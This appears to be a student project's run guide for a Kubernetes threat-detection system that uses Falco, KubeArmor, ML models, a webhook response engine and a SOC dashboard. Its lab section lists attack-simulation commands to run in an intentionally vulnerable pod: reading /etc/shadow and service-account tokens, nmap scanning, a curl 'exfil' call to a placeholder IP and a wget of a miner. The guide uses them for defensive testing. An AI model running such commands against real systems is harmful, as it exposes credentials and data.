# How to Run the AIOps Threat Detection Project

This guide covers **three scenarios**, from easiest to most advanced:

| Scenario | What You Need | What You Get |
|----------|---------------|--------------|
| **A. Local Demo** (mock data) | Just Python | Full pipeline demo with simulated threats on your laptop |
| **B. Local Kubernetes** (real detection) | Docker + Minikube | Actual threat detection on real containers running locally |
| **C. Production Deployment** | Existing K8s cluster | Add this as a security layer to your cloud infrastructure |

---

## A. Run Locally on Your Laptop (Mock Data Demo) — 5 minutes

This is the **quickest way** to see the full system working end-to-end. It uses synthetic telemetry data instead of real Kubernetes, but the ML models, the dashboard, and the response engine all work for real.

### Prerequisites

- Python 3.9+ installed
- Node.js / npm installed (for serving the dashboard)

### Step-by-Step

Open **PowerShell** and run these in order:

```powershell
# 1. Navigate to the project
cd C:\Users\aditya\Documents\PROJECTS\FYP

# 2. Create a virtual environment (if you haven't already)
python -m venv .venv
.\.venv\Scripts\Activate.ps1

# 3. Install dependencies
pip install -r requirements.txt
pip install flask-cors   # <-- This is missing from requirements.txt but needed!

# 4. Generate mock telemetry data (simulates DDoS, exfiltration, crypto mining, etc.)
python data_pipeline/mock_data_generator.py --output mock_telemetry.jsonl --events 5000

# 5. Run the preprocessing pipeline (cleans and structures the data)
python data_pipeline/preprocessing.py --input mock_telemetry.jsonl --output processed_data.csv

# 6. Train the ML models
#    Option A: Train on mock data (quick, lower accuracy but demonstrates the pipeline)
python ml_engine/autoencoder.py --train --data processed_data.csv --epochs 50
python ml_engine/random_forest_classifier.py --train --data processed_data.csv

#    Option B: Train on the DVWA dataset (you already have this — better accuracy)
python ml_engine/autoencoder.py --train --data "dvwa_dataset\processed\dvwa_dataset_ml_ready.csv" --epochs 50
python ml_engine/random_forest_classifier.py --train --data "dvwa_dataset\processed\dvwa_dataset_ml_ready.csv"

# 7. Start the Response Engine API (webhook server) — keep this terminal open
python response_engine/webhook_server.py --port 5000 --debug
```

Now open a **second PowerShell terminal**:

```powershell
# 8. Start the SOC Dashboard
npx -y serve C:\Users\aditya\Documents\PROJECTS\FYP\dashboard -l 3333
```

### What You'll See

- **Dashboard**: Open http://localhost:3333 — a real-time SOC dashboard with charts, entity status, and threat alerts
- **API**: http://localhost:5000/api/v1/status — the webhook server health check

### Send a Test Threat Alert

Open a **third terminal** (or use Postman/your browser's console) to simulate a threat being detected:

```powershell
# Simulate a CRITICAL exfiltration alert
Invoke-RestMethod -Method POST -Uri "http://localhost:5000/api/v1/alert" -ContentType "application/json" -Body '{
  "pod": "api-backend-ghi56",
  "namespace": "aiops-security",
  "threat_type": "exfiltration",
  "confidence_score": 0.95,
  "mitre_technique": "T1041",
  "anomaly_score": 0.87,
  "risk_level": "CRITICAL",
  "predicted_next_stage": "impact"
}'

# Simulate a HIGH DDoS alert
Invoke-RestMethod -Method POST -Uri "http://localhost:5000/api/v1/alert" -ContentType "application/json" -Body '{
  "pod": "web-frontend-abc12",
  "namespace": "aiops-security",
  "threat_type": "ddos",
  "confidence_score": 0.91,
  "mitre_technique": "T1499",
  "anomaly_score": 0.78,
  "risk_level": "HIGH",
  "predicted_next_stage": "impact"
}'

# Simulate a crypto mining alert
Invoke-RestMethod -Method POST -Uri "http://localhost:5000/api/v1/alert" -ContentType "application/json" -Body '{
  "pod": "redis-cache-mno90",
  "namespace": "aiops-security",
  "threat_type": "crypto_mining",
  "confidence_score": 0.88,
  "mitre_technique": "T1496",
  "anomaly_score": 0.82,
  "risk_level": "CRITICAL",
  "predicted_next_stage": "impact"
}'
```

After sending these, **refresh the dashboard** at http://localhost:3333 — you'll see the alerts appear in the Live Alerts table, the charts update, and the Entity Status grid show compromised pods.

### Test the Bayesian Attack Predictor

```powershell
cd C:\Users\aditya\Documents\PROJECTS\FYP
python ml_engine/bayesian_attack_predictor.py
```

This will show you a threat assessment predicting the attacker's next likely move based on observed MITRE ATT&CK stages.

### Run the Tests

```powershell
cd C:\Users\aditya\Documents\PROJECTS\FYP
pytest tests/ -v
```

> [!NOTE]
> In this mode, the Response Engine runs in **dry-run mode** — it logs what actions it *would* take (isolate pod, cordon node, migrate pods) but doesn't actually execute them since there's no Kubernetes cluster. This is perfect for demos and testing.

---

## B. Run Locally with Real Kubernetes (Actual Threat Detection) — 30 minutes

This gives you **real container threat detection** on your laptop using Minikube or Kind.

### Prerequisites

1. **Docker Desktop** — [Download here](https://www.docker.com/products/docker-desktop/)
   - Open Docker Desktop and make sure it's running
2. **Minikube** — [Install guide](https://minikube.sigs.k8s.io/docs/start/)
   ```powershell
   # Install via winget (recommended)
   winget install Kubernetes.minikube
   ```
3. **kubectl** — [Install guide](https://kubernetes.io/docs/tasks/tools/install-kubectl-windows/)
   ```powershell
   winget install Kubernetes.kubectl
   ```
4. **Helm** (for Falco) — [Install guide](https://helm.sh/docs/intro/install/)
   ```powershell
   winget install Helm.Helm
   ```

### Step 1: Start Your Local Kubernetes Cluster

```powershell
# Start Minikube with enough resources
minikube start --driver=docker --cpus=4 --memory=4096

# Verify it's running
kubectl cluster-info
kubectl get nodes
```

### Step 2: Deploy the Infrastructure

```powershell
cd C:\Users\aditya\Documents\PROJECTS\FYP

# Create the namespace
kubectl apply -f infrastructure/k8s/namespace.yaml

# Deploy the vulnerable test application (intentionally vulnerable, for testing only!)
kubectl apply -f infrastructure/k8s/vulnerable-app/

# Verify pods are running
kubectl get pods -n aiops-security
```

### Step 3: Install Falco (Runtime Security Monitor)

Falco monitors **system calls** (syscalls) inside containers and generates alerts when suspicious activity is detected.

```powershell
# Add the Falco Helm repo
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

# Install Falco in the cluster
helm install falco falcosecurity/falco `
  --namespace aiops-security `
  --set falcosidekick.enabled=true `
  --set falcosidekick.config.webhook.address="http://host.minikube.internal:5000/api/v1/alert" `
  --set json_output=true

# Alternatively, apply the custom Falco config from your project
kubectl apply -f infrastructure/k8s/falco/
```

### Step 4: Install KubeArmor (eBPF Security)

```powershell
# Install KubeArmor using karmor CLI
# First install karmor
curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.ps1 | powershell

# Or install via Helm
helm repo add kubearmor https://kubearmor.github.io/charts
helm repo update
helm install kubearmor kubearmor/kubearmor -n aiops-security

# Apply custom KubeArmor policies
kubectl apply -f infrastructure/k8s/kubearmor/
```

### Step 5: Start the Pipeline

Now start the Python backend on your laptop (not inside the cluster):

**Terminal 1 — Response Engine:**
```powershell
cd C:\Users\aditya\Documents\PROJECTS\FYP
.\.venv\Scripts\Activate.ps1
python response_engine/webhook_server.py --port 5000 --debug
```

**Terminal 2 — Dashboard:**
```powershell
npx -y serve C:\Users\aditya\Documents\PROJECTS\FYP\dashboard -l 3333
```

**Terminal 3 — Log Aggregator (collect real Falco logs):**
```powershell
cd C:\Users\aditya\Documents\PROJECTS\FYP
.\.venv\Scripts\Activate.ps1

# Stream Falco logs into the aggregator
kubectl logs -l app.kubernetes.io/name=falco -n aiops-security --follow | python infrastructure/telemetry/log_aggregator.py --stdin --source falco --output unified_telemetry.jsonl
```

### Step 6: Trigger Real Attacks (for testing!)

Exec into the vulnerable app and simulate attacks:

```powershell
# Get the pod name
$POD = kubectl get pods -n aiops-security -l app=vulnerable-app -o jsonpath="{.items[0].metadata.name}"

# Simulate a container shell (triggers Falco: "Terminal shell in container")
kubectl exec -it $POD -n aiops-security -- /bin/bash

# Once inside the container, simulate attack behaviors:
# 1. Read sensitive files (credential access)
cat /etc/shadow
cat /run/secrets/kubernetes.io/serviceaccount/token

# 2. Network scanning (lateral movement / discovery)
apt-get update && apt-get install -y nmap
nmap -sP 10.244.0.0/24

# 3. Outbound connection to suspicious IP (data exfiltration)
curl http://203.0.113.10:9999/exfil

# 4. Crypto mining simulation
wget -qO- http://example.com/xmrig
```

Each of these will trigger Falco alerts → log aggregator → (you can feed into ML engine) → webhook server → dashboard.

> [!IMPORTANT]
> The vulnerable app is **intentionally insecure** and should NEVER be deployed to production. It exists purely as a testbed for generating real attack telemetry.

---

## C. Deploy to an Existing Kubernetes Cluster (Production Security)

This is how you add this project as a **security layer** to a real Kubernetes cluster running in the cloud (AWS EKS, GCP GKE, Azure AKS, or any self-managed cluster).

### Architecture in Production

```
┌───────────────────────────── Your K8s Cluster ─────────────────────────────┐
│                                                                             │
│  Your existing apps          Falco (DaemonSet)     KubeArmor (DaemonSet)   │
│  ┌─────────────┐            ┌──────────────┐      ┌──────────────────┐     │
│  │ App Pod 1   │            │ Monitors ALL │      │ Monitors ALL     │     │
│  │ App Pod 2   │◄───────────│ containers   │      │ containers       │     │
│  │ App Pod 3   │            │ for syscalls │      │ via eBPF         │     │
│  └─────────────┘            └──────┬───────┘      └──────┬───────────┘     │
│                                    │                      │                 │
│                    ┌───────────────┼──────────────────────┘                 │
│                    ▼                                                        │
│           ┌────────────────┐                                                │
│           │  AIOps Engine  │  (Deployment — your ML + Response Engine)      │
│           │  ┌───────────┐ │                                                │
│           │  │ Webhook   │ │  ← receives alerts from Falco/KubeArmor       │
│           │  │ Server    │ │  → creates NetworkPolicies, migrates pods      │
│           │  └───────────┘ │                                                │
│           │  ┌───────────┐ │                                                │
│           │  │ ML Models │ │  ← autoencoder (zero-day) + RF (known)        │
│           │  └───────────┘ │                                                │
│           └────────────────┘                                                │
│                    │                                                        │
│                    ▼                                                        │
│           ┌────────────────┐                                                │
│           │ SOC Dashboard  │  (Deployment + Service/Ingress)               │
│           │ http://...     │  ← security team monitors this                │
│           └────────────────┘                                                │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Step 1: Prepare the Docker Image

First, you need to containerize the Python backend. Create a `Dockerfile`:

```dockerfile
# Dockerfile (create this in project root)
FROM python:3.11-slim

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt && pip install flask-cors

COPY data_pipeline/ data_pipeline/
COPY ml_engine/ ml_engine/
COPY response_engine/ response_engine/
COPY infrastructure/telemetry/ infrastructure/telemetry/

# Copy pre-trained models
COPY ml_engine/dvwa_autoencoder_model.pt ml_engine/
COPY ml_engine/dvwa_autoencoder_model.pt.meta.json ml_engine/
COPY ml_engine/dvwa_rf_model.pkl ml_engine/

EXPOSE 5000
CMD ["python", "response_engine/webhook_server.py", "--port", "5000"]
```

Build and push:

```powershell
# Build the image
docker build -t your-registry/aiops-threat-engine:latest .

# Push to your container registry (Docker Hub, ECR, GCR, ACR, etc.)
docker push your-registry/aiops-threat-engine:latest
```

### Step 2: Create the Kubernetes Deployment Manifests

Create `deploy/aiops-engine.yaml`:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: aiops-security
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: aiops-threat-engine
  namespace: aiops-security
spec:
  replicas: 1
  selector:
    matchLabels:
      app: aiops-threat-engine
  template:
    metadata:
      labels:
        app: aiops-threat-engine
    spec:
      serviceAccountName: aiops-engine-sa
      containers:
        - name: threat-engine
          image: your-registry/aiops-threat-engine:latest
          ports:
            - containerPort: 5000
          env:
            - name: CONFIDENCE_THRESHOLD
              value: "0.85"
          resources:
            requests:
              memory: "512Mi"
              cpu: "250m"
            limits:
              memory: "1Gi"
              cpu: "500m"
---
apiVersion: v1
kind: Service
metadata:
  name: aiops-threat-engine
  namespace: aiops-security
spec:
  selector:
    app: aiops-threat-engine
  ports:
    - port: 5000
      targetPort: 5000
  type: ClusterIP
---
# RBAC — The engine needs permissions to create NetworkPolicies and manage pods
apiVersion: v1
kind: ServiceAccount
metadata:
  name: aiops-engine-sa
  namespace: aiops-security
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: aiops-threat-responder
rules:
  - apiGroups: ["networking.k8s.io"]
    resources: ["networkpolicies"]
    verbs: ["get", "list", "create", "delete", "patch"]
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "delete"]
  - apiGroups: [""]
    resources: ["nodes"]
    verbs: ["get", "list", "patch"]  # for cordoning nodes
  - apiGroups: ["apps"]
    resources: ["deployments", "replicasets"]
    verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: aiops-threat-responder-binding
subjects:
  - kind: ServiceAccount
    name: aiops-engine-sa
    namespace: aiops-security
roleRef:
  kind: ClusterRole
  name: aiops-threat-responder
  apiGroup: rbac.authorization.k8s.io
```

### Step 3: Deploy Falco + Connect to Your Engine

```powershell
# Connect to your cluster
# For EKS:  aws eks update-kubeconfig --name your-cluster
# For GKE:  gcloud container clusters get-credentials your-cluster
# For AKS:  az aks get-credentials --name your-cluster

# Deploy your AIOps engine
kubectl apply -f deploy/aiops-engine.yaml

# Install Falco via Helm — pointing its webhook to your engine
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

helm install falco falcosecurity/falco `
  --namespace aiops-security `
  --set falcosidekick.enabled=true `
  --set falcosidekick.config.webhook.address="http://aiops-threat-engine.aiops-security.svc.cluster.local:5000/api/v1/alert" `
  --set json_output=true

# Install KubeArmor
helm repo add kubearmor https://kubearmor.github.io/charts
helm install kubearmor kubearmor/kubearmor -n aiops-security
kubectl apply -f infrastructure/k8s/kubearmor/kubearmor-policy.yaml
```

### Step 4: Deploy the Dashboard

```yaml
# deploy/dashboard.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: aiops-dashboard
  namespace: aiops-security
spec:
  replicas: 1
  selector:
    matchLabels:
      app: aiops-dashboard
  template:
    metadata:
      labels:
        app: aiops-dashboard
    spec:
      containers:
        - name: dashboard
          image: nginx:alpine
          ports:
            - containerPort: 80
          volumeMounts:
            - name: dashboard-content
              mountPath: /usr/share/nginx/html
      volumes:
        - name: dashboard-content
          configMap:
            name: aiops-dashboard-files
---
apiVersion: v1
kind: Service
metadata:
  name: aiops-dashboard
  namespace: aiops-security
spec:
  selector:
    app: aiops-dashboard
  ports:
    - port: 80
      targetPort: 80
  type: LoadBalancer  # Use 'ClusterIP' + Ingress for production
```

> [!IMPORTANT]
> For the dashboard to work in production, you need to update the `baseUrl` in `dashboard/js/api.js` from `http://localhost:5000/api/v1` to the in-cluster service URL: `http://aiops-threat-engine.aiops-security.svc.cluster.local:5000/api/v1`, or use an Ingress/API Gateway that routes `/api/v1/*` to the engine service.

### Step 5: Verify It's Working

```powershell
# Check all pods are running
kubectl get pods -n aiops-security

# Check Falco is generating events
kubectl logs -l app.kubernetes.io/name=falco -n aiops-security --tail=20

# Check engine is healthy
kubectl port-forward svc/aiops-threat-engine -n aiops-security 5000:5000
# Then visit: http://localhost:5000/api/v1/status

# Check dashboard
kubectl port-forward svc/aiops-dashboard -n aiops-security 3333:80
# Then visit: http://localhost:3333
```

---

## What Actually Happens When a Threat is Detected

Here's the full flow in the working system:

```
1. Container runs suspicious syscall (e.g., exec into shell, read /etc/shadow)
        │
        ▼
2. Falco/KubeArmor DETECTS it and generates a JSON alert
        │
        ▼
3. Alert is sent to the Webhook Server (POST /api/v1/alert)
        │
        ▼
4. Webhook Server checks confidence_score against threshold (default: 0.85)
        │
   ┌────┴────┐
   │ < 0.85  │ → Logged but no action taken
   │ ≥ 0.85  │ → Trigger automated response ↓
   └─────────┘
        │
        ▼
5. Response Engine executes based on risk_level:
   ┌──────────┬──────────────────────────────────────────┐
   │ CRITICAL │ Isolate pod (NetworkPolicy) + Cordon     │
   │          │ node + Migrate healthy pods               │
   │ HIGH     │ Isolate pod (NetworkPolicy)               │
   │ MEDIUM   │ Apply audit-only monitoring policy        │
   │ LOW      │ Log only                                  │
   └──────────┴──────────────────────────────────────────┘
        │
        ▼
6. Dashboard updates in real-time showing:
   • Alert details (pod, threat type, MITRE technique)
   • Response actions taken
   • Entity status (safe/compromised/isolated)
   • Attack progression (kill chain stage)
```

---

## Quick Reference: What Each Component Does

| Component | File(s) | Purpose |
|-----------|---------|---------|
| **Mock Data Generator** | `data_pipeline/mock_data_generator.py` | Creates synthetic attack telemetry for testing |
| **Preprocessing** | `data_pipeline/preprocessing.py` | Cleans raw JSONL → ML-ready CSV |
| **Feature Extraction** | `data_pipeline/feature_extraction.py` | Engineers numeric features from raw events |
| **Autoencoder** | `ml_engine/autoencoder.py` | Detects **zero-day** attacks (unseen patterns) |
| **Random Forest** | `ml_engine/random_forest_classifier.py` | Classifies **known** attack types |
| **Bayesian Predictor** | `ml_engine/bayesian_attack_predictor.py` | Predicts attacker's **next move** in kill chain |
| **MITRE Mapping** | `ml_engine/mitre_attack_mapping.py` | Maps detections to MITRE ATT&CK techniques |
| **Webhook Server** | `response_engine/webhook_server.py` | REST API that receives alerts, triggers response |
| **Network Policy Mgr** | `response_engine/network_policy_manager.py` | Creates K8s NetworkPolicies to isolate pods |
| **Pod Migration** | `response_engine/pod_migration.py` | Cordons nodes and migrates workloads |
| **Log Aggregator** | `infrastructure/telemetry/log_aggregator.py` | Normalizes Falco/KubeArmor events → unified JSON |
| **Dashboard** | `dashboard/` | Real-time SOC UI with alerts, charts, entity status |

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| `ModuleNotFoundError: flask_cors` | Run `pip install flask-cors` |
| `ModuleNotFoundError: pgmpy` | Run `pip install pgmpy` (needed for Bayesian predictor) |
| Dashboard shows no data | Send test alerts via the PowerShell commands above, then refresh |
| Webhook server CORS error | Make sure `flask-cors` is installed and the server is on port 5000 |
| `Cannot load K8s config` warning | Expected in local-only mode — the response engine runs in dry-run |
| Minikube won't start | Make sure Docker Desktop is running first |
| Models have low accuracy on mock data | Train on the DVWA dataset instead (option B in step 6) |

> [!TIP]
> **For a demo/presentation**: Scenario A is all you need. Start the webhook server + dashboard, send the test alerts via PowerShell, and walk through the dashboard showing real-time threat detection, MITRE ATT&CK mapping, and automated response actions.
